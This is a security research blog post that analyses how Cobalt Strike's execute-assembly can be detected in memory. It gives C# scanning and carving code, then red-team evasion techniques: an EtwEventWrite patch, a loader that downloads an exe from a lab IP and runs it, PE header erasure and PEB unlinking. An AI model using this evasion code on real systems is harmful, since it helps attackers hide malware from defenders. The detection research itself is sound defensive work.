</div>
<hgroup>
<h2>
Response
</h2>
</hgroup>
<p>Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.</p>
</a>
</li>
</ul>
</section>
</div>
<div class="subnav-kc">
<section class="content-wrapper">
<ul class="service-list clearfix">
<li>
<a href="https://www.mdsec.co.uk/knowledge-centre/research/">
<hgroup>
<h2>
Research
</h2>
</hgroup>
<p>MDSec&#8217;s dedicated research team periodically releases white papers, blog posts, and tooling.</p>
</a>
</li>
<li>
<a href="https://www.mdsec.co.uk/knowledge-centre/training/">
<hgroup>
<h2>
Training
</h2>
</hgroup>
<p>MDSec&#8217;s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.</p>
</a>
</li>
<li>
<a href="https://www.mdsec.co.uk/knowledge-centre/insights/">
<hgroup>
<h2>
Insights
</h2>
</hgroup>
<p>View insights from MDSec&#8217;s consultancy and research teams.</p>
</a>
</li>
</ul>
</section>
</div>
<section class="insights-single-header">
<div class="content-wrapper">
<div class="the-category">
<span class="category">ActiveBreach</span> </div>
<h1>Detecting and Advancing In-Memory .NET Tradecraft</h1>
</div>
</section>
<section class="full-width-wrapper white pad20-120">
<div class="content-wrapper">
<div class="breadcrumb-wrapper">
<div id="breadcrumbs">
<span>
<span><a href="https://www.mdsec.co.uk/">Home</a> &gt;
<span>
<a href="https://www.mdsec.co.uk/knowledge-centre/">Knowledge Centre</a> &gt;
<a href="https://www.mdsec.co.uk/knowledge-centre/insights">Insights</a> &gt;
<span class="breadcrumb_last" aria-current="page">Detecting and Advancing In-Memory .NET Tradecraft</span>
</span>
</span>
</span>
</div>
</div>
</div>
<div class="insights-content">
<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/Screenshot-2020-06-02-at-16.31.23.png" alt="Detecting and Advancing In-Memory .NET Tradecraft" /></figure></div>
<h2 class="wp-block-heading">Introduction</h2>
<p>In-memory tradecraft is becoming more and more important for remaining undetected during a red team operation, with it becoming common practice for blue teams to peek in to running memory, courtesy of feature advancements in EDR.</p>
<p>We have previously covered the topics of integrating<a rel="noreferrer noopener" href="https://www.mdsec.co.uk/2020/03/offensive-development-with-github-actions/" target="_blank">&nbsp;obfuscation to your pipeline</a>&nbsp;and bypassing&nbsp;<a rel="noreferrer noopener" href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/" target="_blank">Event Tracing for Windows</a>&nbsp;which can both reduce the indicators available for blue teams for detecting offensive in-memory tradecraft.</p>
<p>A recent post titled “<a href="https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/">AppDomainManager Injection and Detection</a>” by Pentest Laboratories provided a great overview of how in-memory .NET execution can be achieved and detected using the AppDomainManager object. This post was the initial spark of curiosity for this research as we began to wonder how these concepts would apply to other .NET execution techniques such as Cobalt Strike’s execute-assembly. Understanding your tools and their weaknesses is one of the most important aspects of being a red teamer.</p>
<p>In this post, we will outline an alternate approach for detecting in-memory assembly execution and highlight some potential strategies for further advancements in tradecraft.</p>
<h2 class="wp-block-heading">Recap on ETW Patching</h2>
<p>Before we cover the main topic of this post, let’s recap on what we learned from our previous&nbsp;<a href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/">post</a>, where we detailed how red teams can patch Event Tracing for Windows functions to restrict the assemblies that are visible inside the CLR of a running process. In summary, this involved patching the&nbsp;<em>ntdll.dll!EtwEventWrite</em>&nbsp;function to prevent events being report.</p>
<p>We can inspect the assemblies that are reported in ProcessHacker through ETW using the .NET assemblies tab as shown below:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-1024x225.png" alt class="wp-image-1960" /></figure>
<p>However, as previously documented,&nbsp;<em>EtwEventWrite</em>&nbsp;can be patched causing it to immediately return using code similar to the following:</p>
<pre class="wp-block-code"><code>internal static void PatchEtwEventWrite()
{
	bool result;
	var hook = new byte&#91;] { 0xc2, 0x14, 0x00, 0x00 };
	var address = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
        result = VirtualProtect(address, (UIntPtr)hook.Length, (uint)MemoryProtectionConsts.EXECUTE_READWRITE, out uint oldProtect);
	Marshal.Copy(hook, 0, address, hook.Length);
	result = VirtualProtect(address, (UIntPtr)hook.Length, oldProtect, out uint blackhole);
}</code></pre>
<p>After applying the patch, a similar view to the following will be presented which limits the effectiveness of ETW:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-1-1024x108.png" alt class="wp-image-1961" /></figure>
<p>At this stage, we were wondering how hidden is our .NET exe when running in memory and began to analyse how Cobalt Strike’s beacon&nbsp;<em>execute-assembly</em>&nbsp;feature worked.</p>
<h2 class="wp-block-heading">Analysis of Cobalt Strike’s execute-assembly</h2>
<p>Cobalt Strike’s&nbsp;<em>execute-assembly</em>&nbsp;function provides a post-exploitation feature to inject the CLR in to a remote process as dictated by the malleable profile’s&nbsp;<em>spawnto</em>&nbsp;<a rel="noreferrer noopener" href="https://www.cobaltstrike.com/help-malleable-postex" target="_blank">configuration</a>.</p>
<p>We won’t cover how the CLR is injected, as this was detailed in our previous&nbsp;<a rel="noreferrer noopener" href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/" target="_blank">post</a>. However, it is worth noting that the CLR DLLs&nbsp;<em>clr.ddl</em>,&nbsp;<em>clrjit.dll</em>&nbsp;and friends are loaded in to any running process when leveraging the CLR, and Cobalt Strikes&nbsp;<em>execute-assembly</em>&nbsp;is no exception:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-2-1024x153.png" alt class="wp-image-1962" /></figure>
<p>This of course gives blue teamers hunting for in-memory .NET execution a starting point to narrow down which process might be hosting a .NET exe. This can no doubt be baselined to identify anomalies of processes loading the CLR that shouldn’t be.&nbsp;<a rel="noreferrer noopener" href="https://twitter.com/TheWover" target="_blank">TheWover</a>&nbsp;also provides a fantastic&nbsp;<a rel="noreferrer noopener" href="https://github.com/TheWover/ModuleMonitor%EF%BB%BF" target="_blank">tool</a>&nbsp;for monitoring module loads which can be used as a means of detecting processes loading the CLR.</p>
<p>The configuration of the remote process injection can be somewhat controlled using the options within a&nbsp;<em>process-inject</em>&nbsp;block, allowing amongst other things the initial and final page permissions to be set using the&nbsp;<em>startrwx</em>&nbsp;and&nbsp;<em>userwx</em>&nbsp;settings. These allow memory to be initially allocated with&nbsp;<em>READWRITE</em>&nbsp;permissions, then&nbsp;<em>VirtualProtect</em>ed to&nbsp;<em>EXECUTE_READ</em>&nbsp;to avoid the undesirable setting of&nbsp;<em>EXECUTE_READWRITE</em>&nbsp;that is commonly searched for by blue teams.</p>
<p>Let’s execute a long running process so we can properly analyse what’s happening in our injected process:</p>
<pre class="wp-block-code"><code>public static void Main(string&#91;] args)
{
	while (true)
	{
		Console.WriteLine("Sleeping");
		Thread.Sleep(60000);
	}
}</code></pre>
<p>Peeking inside the process defined in our&nbsp;<em>spawnto</em>&nbsp;configuration, we can quickly identify our .NET binary by doing a string search for any strings with a minimum length of 10 which quickly points to our .NET exe’s PE header:</p>
<figure class="wp-block-image is-resized"><img fetchpriority="high" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-3-1024x1003.png" alt class="wp-image-1963" width="512" height="502" /></figure>
<p>As expected, this sits in a&nbsp;<em>EXECUTE_READ</em>&nbsp;page courtesy of our malleable profile’s&nbsp;<em>userwx</em>&nbsp;configuration.</p>
<p>At this stage, we have our .NET exe mapped in memory but this is not an uncommon occurrence in the CLR and is to be expected, particularly when using methods such as&nbsp;<em>Assembly.Load()</em>. Indeed, scanning the entirety of private memory for all running processes on a standard Windows 10 desktop revealed several processes with private memory containing PE headers.</p>
<p>However, let’s look at what happens when we use a simple loader to retrieve and execute an exe through&nbsp;<em>Assembly.Load()</em>. To do this, we’ll use a simple stub like the following:</p>
<pre class="wp-block-code"><code>var webClient = new System.Net.WebClient();
var data = webClient.DownloadData("http://10.37.129.2:8888/DummyConsole.exe");
try
{
	MethodInfo target = Assembly.Load(data).EntryPoint;
	target.Invoke(null, new object&#91;] { null });
}
catch (Exception ex)
{
	Console.WriteLine(ex.Message);
}</code></pre>
<p>Loading this process in to Process Hacker, we can quickly discover our&nbsp;<em>DummyConsole.exe</em>&nbsp;app again mapped in memory:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-4-1024x270.png" alt class="wp-image-1964" /></figure>
<p>However, the key difference here is that the page permissions are not executable, which is to be expected since normal execution will rather read the IL and jit it elsewhere.</p>
<p>With this in mind, we now have a potential indicator for the use of&nbsp;<em>execute-assembly</em>; during all testing we were unable to identify any other processes using the CLR that contained PE headers inside either&nbsp;<em>EXECUTE_READ</em>&nbsp;or&nbsp;<em>EXECUTE_READWRITE</em>&nbsp;pages or any circumstances under which it could occur outside of Cobalt Strike’s&nbsp;<em>execute-assembly</em>.</p>
<h3 class="wp-block-heading">Hunting for execute-assembly</h3>
<p>Now that we have a potential Indicator of Compromise (IoC) for&nbsp;<em>execute-assembly</em>, let’s look at how we can hunt for it.</p>
<p>The first thing we need to do is narrow down our hunt to only processes with the CLR loaded, we can do this in C# with a simple excerpt such as the following which will retrieve a list of running processes and their loaded modules:</p>
<pre class="wp-block-code"><code>Process&#91;] processlist = Process.GetProcesses();
foreach (Process theprocess in processlist)
{
	try
	{
		ProcessModuleCollection myProcessModuleCollection = theprocess.Modules;
		ProcessModule myProcessModule;
		for (int i = 0; i &lt; myProcessModuleCollection.Count; i++)
		{
			myProcessModule = myProcessModuleCollection&#91;i];
			if (myProcessModule.ModuleName.Contains("clr.dll"))
			{
				Console.WriteLine("######### Process: {0} ID: {1}", theprocess.ProcessName, theprocess.Id);
				Console.WriteLine("The moduleName is " + myProcessModule.ModuleName);
				Console.WriteLine("The " + myProcessModule.ModuleName + "'s base address is: " + myProcessModule.BaseAddress);
				Console.WriteLine("The " + myProcessModule.ModuleName + "'s Entry point address is: " + myProcessModule.EntryPointAddress);
				Console.WriteLine("The " + myProcessModule.ModuleName + "'s File name is: " + myProcessModule.FileName);
				i = myProcessModuleCollection.Count;
			}
		}
	}
	catch (Exception e)
	{
		Console.WriteLine("!!!!!!!! Unable to Access Process: {0} ID: {1}", theprocess.ProcessName, theprocess.Id);
	}
}</code></pre>
<p>The output of this will look something similar to the following:</p>
<figure class="wp-block-image is-resized"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-5-1024x814.png" alt class="wp-image-1965" width="512" height="407" /></figure>
<p>Now that we have a list of processes using the CLR, we need to search each of them for PE headers inside&nbsp;<em>EXECUTE_READ</em>&nbsp;or&nbsp;<em>EXECUTE_READWRITE</em>&nbsp;pages.</p>
<p>Achieving this is relatively straight forward, we simply recover the details around allocated private memory for each of the processes using the CLR, then read that memory, scanning for a PE header:</p>
<pre class="wp-block-code"><code>static Byte&#91;] peHeader = new Byte&#91;] { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65 };
public static void MemScan(string processName)
{
	SYSTEM_INFO sys_info = new SYSTEM_INFO();
	GetSystemInfo(out sys_info);
	UIntPtr proc_min_address = sys_info.minimumApplicationAddress;
	UIntPtr proc_max_address = sys_info.maximumApplicationAddress;
	ulong proc_min_address_l = (ulong)proc_min_address;
	ulong proc_max_address_l = (ulong)proc_max_address;
	Process process = Process.GetProcessesByName(processName);
	UIntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, (uint)process.Id);
	MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();
	uint bytesRead = 0;
	while (proc_min_address_l &lt; proc_max_address_l)
	{
		VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
		if (((mem_basic_info.Protect == PAGE_EXECUTE_READWRITE) || (mem_basic_info.Protect == PAGE_EXECUTE_READ)) &amp;&amp; mem_basic_info.State == MEM_COMMIT)
		{
			byte&#91;] buffer = new byte&#91;mem_basic_info.RegionSize];
			ReadProcessMemory(processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);
			IntPtr Result = _Scan(buffer, peHeader);
			if (Result != IntPtr.Zero)
			{
				Console.WriteLine("!!! Found PE binary in region: 0x{0}, Region Sz 0x{1}", (mem_basic_info.BaseAddress).ToString("X"), (mem_basic_info.RegionSize).ToString("X"));
			}
		}
		proc_min_address_l += mem_basic_info.RegionSize;
		proc_min_address = new UIntPtr(proc_min_address_l);
	}
}</code></pre>
<p>Rerunning our hunter, this time with our newly added memory scanner in it, we discover the PE binary in our&nbsp;<em>spawnto</em>&nbsp;process:</p>
<figure class="wp-block-image is-resized"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-6-1024x754.png" alt class="wp-image-1966" width="512" height="377" /></figure>
<p>We can validate that this is correct by analysing the process in Process Hacker:</p>
<figure class="wp-block-image is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-7-1024x839.png" alt class="wp-image-1967" width="512" height="420" /></figure>
<p>Now that we know we can identify a .NET exe injected by&nbsp;<em>execute-assembly</em>, we can trivially carve it from memory by extracting the full page as follows:</p>
<pre class="wp-block-code"><code>if (Result != IntPtr.Zero)
{
	Console.WriteLine("!!! Found PE binary in region: 0x{0}, Region Sz 0x{1}", (mem_basic_info.BaseAddress).ToString("X"), (mem_basic_info.RegionSize).ToString("X"));
	Console.WriteLine("!!! Carving PE from memory...");
	using (FileStream fileStream = new FileStream("out.exe", FileMode.Create))
	{
		for (uint i = (uint)Result; i &lt; mem_basic_info.RegionSize; i++)
		{
			fileStream.WriteByte(buffer&#91;i]);
		}
	}
}</code></pre>
<p>Rerunning our hunter, we now are able to not only able to identify the use of&nbsp;<em>execute-assembly</em>, but also carve the binary from the remote process:</p>
<figure class="wp-block-image is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-8-1024x629.png" alt class="wp-image-1968" width="512" height="315" /></figure>
<p>We can confirm that we’ve carved the binary from memory by attempting to run it, although of course in the scenario of a blue team investigation more caution should be taken:</p>
<figure class="wp-block-image is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-9.png" alt class="wp-image-1969" width="496" height="316" /></figure>
<h2 class="wp-block-heading">In-Memory .NET Tradecraft OpSec for Red Teams</h2>
<p>Now that we’ve looked at how blue teams can detect&nbsp;<em>execute-assembly</em>, what approaches can we take to mitigate such investigations from an offensive perspective?</p>
<p>Firstly, if we consider how our methodology for detection works we can potentially look at opportunities for how to disrupt it. The key indicators for in-memory .NET execution in our methodology are:</p>
<ul class="wp-block-list"><li>The CLR related modules loaded inside a process,</li><li>RX or RW page permissions,</li><li>PE headers inside these pages.</li></ul>
<p>With this in mind, there are several strategies which we can use to potentially better our in-memory .NET tradecraft:</p>
<ul class="wp-block-list"><li>As the CLR DLLs are loaded in to the remote process, we should consider using a process that legitimately hosts the CLR as our&nbsp;<em>spawnto</em>&nbsp;for&nbsp;<em>execute-assembly</em>&nbsp;to avoid suspicious module loads being baselined.</li><li>When searching for loaded DLLs, the most common approach used by many tools is to read the module list from the Process Environment Block. The approach to hiding the CLR DLLs involves unlinking the modules from the&nbsp;<em>InLoadOrderModuleList</em>,&nbsp;<em>InMemoryOrderModuleList</em>,&nbsp;<em>InInitializationOrderModuleList</em>&nbsp;and&nbsp;<em>HashTableEntry</em>&nbsp;lists. This rudimentary approach may be used to hide the presence of&nbsp;<em>clr.dll</em>,&nbsp;<em>clrjit.dll</em>&nbsp;and friends and potentially fool tools that rely on walking the PEB, in to not recognising that the process is using the CLR.</li><li>Unfortunately, as far as we are aware there is no way to leave a page with&nbsp;<em>READWRITE</em>&nbsp;permissions using only Cobalt Strike’s remote process injection. However, it is of course possible to&nbsp;<em>VirtualProtect</em>&nbsp;these and you may want to bootstrap this in to your pipeline. We will be following up with more research in this space over the coming months ????</li><li>One potential consideration for your tradecraft may also be to avoid or limit the use of long running .NET assemblies in memory as outside of monitoring of module loads, in most cases memory scanning occurs at point in time. Therefore the longer your .NET exe persists in memory, the greater chance it has of being detected.</li><li>As we’re searching for a PE binary in memory, one option to potentially limit these searches is to stomp the PE headers. We’ll walk through this next.</li><li>Finally, as we have seen, the .NET exe sits plaintext in memory and as such we would also advise obfuscating your .NET exe as part of your pipeline. An approach for this using Azure Pipelines was previously detailed by the marvellous MDSec’er Adam Chester in this&nbsp;<a href="https://blog.xpnsec.com/building-modifying-packing-devops/">post</a>.</li></ul>
<p>As noted, it may be desirable to stomp the PE headers for our .NET exe from memory, while leaving the page permissions as&nbsp;<em>READWRITE</em>. This can be achieved by first retrieving the first blocks of allocated memory inside our&nbsp;<em>spawnto</em>&nbsp;process (which is where the .NET exe seems to get mapped), then setting the page permissions to&nbsp;<em>READWRITE</em>&nbsp;and using&nbsp;<em>RtlFillMemory</em>&nbsp;to overwrite the PE header. This can be accomplished using code similar to the following:</p>
<pre class="wp-block-code"><code>private static int ErasePEHeader()
{
	SYSTEM_INFO sys_info = new SYSTEM_INFO();
	GetSystemInfo(out sys_info);
	UIntPtr proc_min_address = sys_info.minimumApplicationAddress;
	UIntPtr proc_max_address = sys_info.maximumApplicationAddress;
	ulong proc_min_address_l = (ulong)proc_min_address;
	ulong proc_max_address_l = (ulong)proc_max_address;
	Process currentProcess = Process.GetCurrentProcess();
	MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();
	VirtualQueryEx(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
	proc_min_address_l += mem_basic_info.RegionSize;
	proc_min_address = new UIntPtr(proc_min_address_l);
	VirtualQueryEx(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
	Console.WriteLine("Base Address: 0x{0}", (mem_basic_info.BaseAddress).ToString("X"));
	bool result = VirtualProtect((UIntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)MemoryProtectionConsts.READWRITE, out uint oldProtect);
	FillMemory((UIntPtr)mem_basic_info.BaseAddress, 132, 0);
	Console.WriteLine("PE Header overwritten at 0x{0}", (mem_basic_info.BaseAddress).ToString("X"));
	return 0;
}</code></pre>
<p>Rather than YOLO zero’ing memory, you may want to verify that it’s actually the expected PE header first; this can be trivially done using the same code from our memory scanner but is omitted for brevity; you may also potentially want to alter this to scan the heap and clean up any other allocated copies of your exe that may be lingering out there.</p>
<p>Combining this with our previously detailed ETW bypass (modifying the patch accordingly for x64) we now have a method of better hiding our .NET tradecraft in-memory. If we review our .NET assemblies in Process Hacker we can see they are not being reported:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-10.png" alt class="wp-image-1973" /></figure>
<p>And the PE header for our .NET exe is now gone and the page permissions are set to RW:</p>
<figure class="wp-block-image"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2020/06/image-11.png" alt class="wp-image-1974" /></figure>
<h2 class="wp-block-heading">Conclusions</h2>
<p>In this post we have outlined a methodology for blue teams to detect in-memory .NET execution, detailing a case study of Cobalt Strike’s&nbsp;<em>execute-assembly</em>&nbsp;feature and identifying indicators of compromise for the built-in execute-assembly feature. With this knowledge, we presented a number of OpSec strategies that red teamers can leverage to further their in-memory tradecraft and disguise the artifacts exposed to the blue team.</p>
<p>The source code for the memory scanner can be found&nbsp;<a rel="noreferrer noopener" href="https://github.com/dmchell/Sniper" target="_blank">here</a>.</p>
<p>This blog post was written by Dominic Chell.</p>
</div>
<div class="author">
<div class="content-wrapper clearfix">
<div class="author-avatar">
<img alt src="https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&#038;d=wp_user_avatar&#038;r=g" srcset="https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=192&#038;d=wp_user_avatar&#038;r=g 2x" class="avatar avatar-96 photo" height="96" width="96" loading="lazy" decoding="async" /> </div>
<div class="author-meta">
<div class="author-meta__content">
<span>written by</span>
<h4>MDSec Research</h4>
</div>
</div>
</div>
</div>
<section class="testing">
<div class="content-wrapper">
<h2>Ready to engage<br>with MDSec?</h2>
<div class="button">
<a href="https://www.mdsec.co.uk/contact">
Get in touch
</a>
</div>
</div>
</section>
</section>
<section class="newsletter">
<div class="content-wrapper clearfix">
<div class="newsletter-left">
<p>
Stay updated with the latest <br>news from MDSec.
</p>
</div>
<div class="newsletter-right">
<div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_2_container">
<form enctype="multipart/form-data" method="post" class="frm-show-form  frm_js_validate " id="form_newslettersignupform">
<div class="frm_form_fields ">
<fieldset>
<legend class="frm_screen_reader">Newsletter Signup Form</legend>
<div class="frm_fields_container">
<input type="hidden" name="frm_action" value="create" />
<input type="hidden" name="form_id" value="2" />
<input type="hidden" name="frm_hide_fields_2" id="frm_hide_fields_2" value />
<input type="hidden" name="form_key" value="newslettersignupform" />
<input type="hidden" name="item_meta[0]" value />
<input type="hidden" id="frm_submit_entry_2" name="frm_submit_entry_2" value="ac396ae5bb" /><input type="hidden" name="_wp_http_referer" value="/2020/06/detecting-and-advancing-in-memory-net-tradecraft/" /><div id="frm_field_10_container" class="frm_form_field form-field  frm_none_container frm_full">
<label for="field_nkjbj" id="field_nkjbj_label" class="frm_primary_label">Email
<span class="frm_required"></span>
</label>
<input type="email" id="field_nkjbj" name="item_meta[10]" value placeholder="Enter your email for updates" data-invmsg="Email is invalid" aria-invalid="false" />
</div>
<div id="frm_field_11_container" class="frm_form_field form-field  frm_none_container frm_first frm_full">
<label for="g-recaptcha-response" id="field_ah4d8_label" class="frm_primary_label">
<span class="frm_required"></span>
</label>
<div id="field_ah4d8" class="frm-g-recaptcha" data-sitekey="6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw" data-size="invisible" data-theme="light"></div>
</div>
<input type="hidden" name="item_key" value />
<div class="frm__6539d1f4bfefd">
<label for="frm_email_2" style="display:none;">
If you are human, leave this field blank. </label>
<input id="frm_email_2" type="text" class="frm_verify" name="frm__6539d1f4bfefd" value autocomplete="off" style="display:none;" />
</div>
<div class="frm_submit">
<button class="frm_button_submit" type="submit">Submit</button>
</div></div>
</fieldset>
</div>
</form>
</div>
</div>
</div>
</section>
</div>


<footer>
<div class="content-wrapper clearfix">
<div class="footer-col">
<div class="footer-logo">
<a href="https://www.mdsec.co.uk" title="MDSec">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/mdsec-logo.svg" alt="MDsec">
</a>
</div>
</div>
<div class="footer-col">
<h3>Services</h3>
<nav class="footer-nav">
<ul>
<li><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
<li><a href="https://www.mdsec.co.uk/our-services/applicaton-security/">Application Security</a></li>
<li><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
<li><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
</ul>
</nav>
<h3>Resource Centre</h3>
<nav class="footer-nav">
<ul>
<li><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
<li><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
<li><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
</ul>
</nav>
</div>
<div class="footer-col">
<h3>Company</h3>
<nav class="footer-nav">
<ul>
<li><a href="https://www.mdsec.co.uk/about/">About</a></li>
<li><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
<li><a href="https://www.mdsec.co.uk/careers/">Careers</a></li>
<li><a href="https://www.mdsec.co.uk/privacy-policy/">Privacy</a></li>
</ul>
</nav>
<p>
t: +44 (0) 1625 263 503<br>
e: <a href="mailto:contact@mdsec.co.uk">contact@mdsec.co.uk</a>
</p>
<p>
32A Park Green<br>
Macclesfield<br>
Cheshire<br>
SK11 7NA
</p>
</div>
<div class="footer-col">
<h3>Accreditations</h3>
<div class="logo-list clearfix">
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/best.png" alt="Best">
</div>
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/uploads/2019/11/check-whitetrans.png" alt="IT Health Check Service">
</div>
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest-star.png" alt="Crest Star">
</div>
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest.png" alt="Crest">
</div>
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/cyber-essentials.png" alt="Cyber Essentials">
</div>
<div class="logo-list__item">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/british-assessment-bureau.png" alt="British Assessment Bureau">
</div>
</div>
</div>
</div>
</footer>
<div class="end clearfix">
<div class="end__left">
Copyright 2024 MDSec
</div>
<div class="end__right">

</div>
</div>

<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-includes/js/jquery/jquery.js?ver=1.11.0" id="jquery-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/main.js?ver=1" id="main-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/highlight.min.js?ver=1" id="prism-js-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/isotope.pkgd.min.js?ver=1" id="isotope-js-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/jquery.matchHeight.js?ver=1.0.0" id="matchheight-js-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/modernizr.js?ver=2.8.3" id="modernizr-script-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" id="formidable-js-extra">
/* <![CDATA[ */
var frm_js = {"ajax_url":"https:\/\/www.mdsec.co.uk\/wp-admin\/admin-ajax.php","images_url":"https:\/\/www.mdsec.co.uk\/wp-content\/plugins\/formidable\/images","loading":"Loading\u2026","remove":"Remove","offset":"4","nonce":"9b6cd53213","id":"ID","no_results":"No results match","file_spam":"That file looks like Spam.","calc_error":"There is an error in the calculation in the field with key","empty_fields":"Please complete the preceding required fields before uploading a file.","focus_first_error":"1","include_alert_role":"1","include_resend_email":""};
/* ]]> */
</script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="https://www.mdsec.co.uk/wp-content/plugins/formidable/js/frm.min.js?ver=6.16" id="formidable-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript" defer="defer" async="async" src="https://www.google.com/recaptcha/api.js?onload=frmRecaptcha&amp;render=explicit&amp;ver=3" id="captcha-api-js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript">
		
		$grid = jQuery('.grid').isotope({
			itemSelector: '.grid-item',
			percentPosition: true,
			masonry: {
			columnWidth: '.grid-sizer',
			gutter: '.gutter-sizer',
			}
		});

		jQuery('.filter-group').on( 'click', 'li', function() {
			var filterValue = jQuery(this).attr('data-filter');
			var filterName = jQuery(this).attr('data-name');
			$grid.isotope({ filter: filterValue });
			var elems = $grid.isotope('getFilteredItemElements');
			jQuery(".sort-group-item").removeClass('active');

		});	

	</script>
<script type="a1e5d288847e28772d429a79-text/javascript" src="/wp-content/themes/mdsec/jquery.marquee.min.js"></script>
<script type="a1e5d288847e28772d429a79-text/javascript">
	jQuery(window).load(function() {
		jQuery('.message').marquee({
			//speed in milliseconds of the marquee
			duration: 12000,
			//gap in pixels between the tickers
			gap: 0,
			//time in milliseconds before the marquee will start animating
			delayBeforeStart: 500,
			//'left' or 'right'
			direction: 'left',
			//true or false - should the marquee be duplicated to show an effect of continues flow
			duplicated: true,
			pauseOnHover: true,
			startVisible: true
		});
		
		jQuery('.message-item').css('opacity', '1');
	});
	</script>
<script type="a1e5d288847e28772d429a79-text/javascript">hljs.initHighlightingOnLoad();</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a1e5d288847e28772d429a79-|49" defer></script></body>

</html>
